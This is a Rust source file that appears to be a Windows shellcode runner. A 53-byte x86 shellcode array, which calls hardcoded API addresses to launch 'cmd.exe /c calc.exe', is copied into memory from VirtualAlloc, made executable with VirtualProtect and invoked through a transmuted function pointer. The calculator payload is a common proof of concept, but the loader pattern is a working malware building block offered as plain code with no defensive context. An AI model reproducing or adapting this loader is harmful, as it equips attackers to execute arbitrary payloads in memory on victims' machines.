/*
    Windows x32 Calc.exe Shellcode
*/

use std::ptr::null_mut;

use winapi::um::memoryapi::{VirtualAlloc, VirtualProtect};

fn main() -> std::io::Result<()> {

    // windows x32 bit
    let shellcode: [u8; 53] = [
        0xeb, 0x1b, 0x5b, 0x31, 0xc0, 0x50, 0x31, 0xc0, 0x88, 0x43, 0x13, 0x53, 0xbb, 0xad, 0x23, 0x86,
        0x7c, 0xff, 0xd3, 0x31, 0xc0, 0x50, 0xbb, 0xfa, 0xca, 0x81, 0x7c, 0xff, 0xd3, 0xe8, 0xe0, 0xff,
        0xff, 0xff, 0x63, 0x6d, 0x64, 0x2e, 0x65, 0x78, 0x65, 0x20, 0x2f, 0x63, 0x20, 0x63, 0x61, 0x6c,
        0x63, 0x2e, 0x65, 0x78, 0x65,
    ];


    unsafe {
        let mem = VirtualAlloc(null_mut(), shellcode.len(), 0x1000 | 0x2000, 0x04);

        if mem.is_null() {
            return Err(std::io::Error::last_os_error());
        }

        std::ptr::copy_nonoverlapping(shellcode.as_ptr(), mem as *mut u8, shellcode.len());

        let mut old_protect = 0;
        let result = VirtualProtect(mem, shellcode.len(), 0x40, &mut old_protect);

        if result == 0 {
            return Err(std::io::Error::last_os_error());
        }

        let func: extern "C" fn() = std::mem::transmute(mem);
        func();
    }

    Ok(())
}

